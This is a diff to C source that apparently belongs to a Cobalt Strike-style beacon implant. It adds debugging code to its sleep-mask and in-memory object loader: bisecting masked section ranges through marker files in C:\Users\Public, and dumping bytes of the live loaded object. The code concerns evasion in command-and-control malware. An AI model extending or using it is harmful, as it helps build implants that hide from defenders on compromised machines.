@@ -329,6 +329,21 @@ static DWORD sm_image_size(char * base) {
 	return *(DWORD *)(base + e_lfanew + 0x50);
 }
 
+/* Keep only the first `keep` pairs of the (real) sections table and END it:
+ * bisects which masked range kills the process. */
+static void sm_keep_pairs(GARGLEP * gp, int keep) {
+	int i;
+	if (gp == NULL || gp->sections == NULL)
+		return;
+	for (i = 0; i < 64; i++) {
+		if (i == keep || (gp->sections[i * 2] == 0 && gp->sections[i * 2 + 1] == 0)) {
+			gp->sections[i * 2] = 0;
+			gp->sections[i * 2 + 1] = 0;
+			return;
+		}
+	}
+}
+
 /* Clamp the sections walk to our own image: pairs beyond SizeOfImage end
  * the table, pairs straddling it are cut. Returns the new span. */
 static DWORD sm_clamp_sections(GARGLEP * gp) {
@@ -401,6 +416,17 @@ static void sm_dump_gparms(GARGLEP * gp, char * bof, SIZE_T blen, DWORD t,
 		unsigned __int64 v = *(unsigned __int64 *)entryp;
 		n += wsprintfA(buf + n, "entry=%p bytes=%08X%08X\r\n",
 			entryp, (unsigned)(v >> 32), (unsigned)v);
+	}
+	/* sample the live BOF mapping so it can be diffed against the
+	 * sleepmask.x64.o we disassembled offline */
+	{
+		int s;
+		static const int spots[] = { 0x40, 0x80, 0xc0, 0x100, 0x180 };
+		for (s = 0; s < 5 && bof != NULL; s++) {
+			unsigned __int64 v = *(unsigned __int64 *)(bof + spots[s]);
+			n += wsprintfA(buf + n, "bof[%03X]=%08X%08X\r\n",
+				spots[s], (unsigned)(v >> 32), (unsigned)v);
+		}
 	}
 	if (gp->sections == NULL)
 		n += wsprintfA(buf + n, "sections=NULL\r\n");
@@ -813,6 +839,19 @@ BOOL command_inline_execute_object_parsed(char * objblob, int objlen, DWORD entr
 						sm_mode |= 16;
 					if (GetFileAttributesA("C:\\Users\\Public\\sm_t1") != INVALID_FILE_ATTRIBUTES)
 						sm_mode |= 32;
+					/* sm_p1..sm_p6: keep only the first N pairs (bisect) */
+					{
+						int pn;
+						for (pn = 1; pn <= 6; pn++) {
+							char mp[32];
+							wsprintfA(mp, "C:\\Users\\Public\\sm_p%d", pn);
+							if (GetFileAttributesA(mp) != INVALID_FILE_ATTRIBUTES) {
+								sm_mode |= (DWORD)(0x100 << pn);
+								sm_keep_pairs(gparms, pn);
+								break;
+							}
+						}
+					}
 					sm_span = sm_max_end(gparms);
 					g_sm_spanraw = sm_span;
 					g_sm_img = sm_image_size(gparms ? gparms->beacon_ptr : NULL);
